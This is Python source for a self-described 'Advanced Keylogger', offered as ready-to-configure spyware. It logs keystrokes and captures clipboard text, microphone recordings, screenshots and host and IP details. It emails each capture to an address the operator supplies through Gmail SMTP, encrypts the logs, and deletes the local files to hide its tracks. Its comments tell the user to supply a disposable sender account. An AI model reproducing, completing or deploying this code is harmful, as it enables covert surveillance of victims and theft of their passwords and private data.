# Main Key-Logger program 
# Create an Advanced Keylogger in Python

##########################################################
##########################################################

# libraries / dependecies included 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# for collecting computer information 
import socket
import platform

import win32clipboard

# to catch key-strokes (basic key-logger functionality)
from pynput.keyboard import Key, Listener

# for tracking time of the system  
import time
import os

# for collecting microphone information along the runtime 
from scipy.io.wavfile import write
import sounddevice as sd

# to encrypt our obtained files
from cryptography.fernet import Fernet

# to get usernames
import getpass
# for getting some more computer processing
from requests import get

# for collecting screenshots during run time, one at a time 
from multiprocessing import Process, freeze_support
from PIL import ImageGrab # pillow module for grabbing screenshots 

##########################################################
##########################################################

#creating a file to store key-strokes 

keys_information = "key_log.txt"
# variable to store system variable 
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 5 # 5 seconds of recording time 
time_iteration = 20 # 10 seconds 
# number of iterations for each functionality 
number_of_iterations_end = 1

# FROM email address 
email_address = "" # Enter disposable email here !!
password = "" # Enter FROM email password here !!

username = getpass.getuser()

# TO enmail address 
toaddr = "" # Enter the email address you want to send your information to !! 

# generate an encryption key from "GenerateKey.py"
# IMPORTANT -
# alter this after each single execution of  keylogger 
key = "" # Enter the new encryption key 

# Enter the file path you want your files to be saved to

file_path = "" # enter the file path of 'Saved Logs' folder !!
extend = "\\"
file_merge = file_path + extend

##########################################################
##########################################################

# getting the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        # getting system host name 
        hostname = socket.gethostname()
        # getting system IP address 
        IPAddr = socket.gethostbyname(hostname)
        # getting public IP address only, 
        # "https://api.ipify.org" it kind of allows getting public IP address only 3 times
        # if we are successfull in getting public IP address
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        # if we don't succeed in getting public IP address,
        # giving this error message in our log file 
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        # getting system processor information 
        f.write("Processor: " + (platform.processor()) + '\n')
        # getting system information (ex - windows version)
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        # getting machine information 
        f.write("Machine: " + platform.machine() + "\n")
        # getting hostname information 
        f.write("Hostname: " + hostname + "\n")
        # getting private IP address 
        f.write("Private IP Address: " + IPAddr + "\n")

# end of function 
# calling function 
computer_information()

##########################################################
##########################################################

##########################################################
##########################################################

# get the clipboard contents (the contents we copy and paste while the program is running)
def copy_clipboard():
    # only storing string content while copy and pasting 
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        # if the clipboard content is non-string (ex - img's, ppt's, folders, audio ...)
        except:
            f.write("Clipboard could be not be copied")

# end of function 
# calling this function 
copy_clipboard()

##########################################################
##########################################################

# get the microphone
def microphone():
    #common sampling frequency 
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# end of function 
# calling this function 
microphone()

##########################################################
##########################################################

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# end of function 
# calling this fucntion
screenshot()

##########################################################
##########################################################

# making email fucntionality along with the keylogger 
def send_email(filename, attachment, toaddr):

    fromaddr = email_address # defining the from address 

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File" # creating the subject line 

    body = "Body_of_the_mail" 

    #attaching the body with the extracted system log files 
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    # encoding our message 
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    # starting SMTP session 
    # using port 587 (587 is typically used for these kind of purpose)
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()
    
    #sending the email after completing everything
    s.sendmail(fromaddr, toaddr, text)
    print ('email sent') #checking purpose 
    # quitting SMTP session after mail is sent
    s.quit()

# end of function 

##########################################################
##########################################################

#main file 
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        #getting the current time when the kay is pressed 
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            # formatting the key-logger text file in a convienient way
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime: #when the execution of the keylogger is over, it's time to send the mail
        
        #starting calling the function
        send_email(keys_information, file_path + extend + keys_information, toaddr)
        
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)

        computer_information()
        send_email(system_information, file_path + extend + system_information, toaddr)
        
        microphone()
        send_email(audio_information, file_path + extend + audio_information, toaddr)
        #ending calling functions part
        
        #with open(file_path + extend + keys_information, "w") as f:
            #f.write(" ")


        number_of_iterations += 1

        currentTime = time.time()
        
        stoppingTime = time.time() + time_iteration
  

##########################################################
##########################################################

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    # rb - 'read bianary' 
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    # send the encrypted files to our email
    #temporary removal for checking 
    #send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

# after each iteration, let the system rest for 2mins while the sending of information can happen smoothly 
time.sleep(50)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)

##########################################################
##########################################################

#end 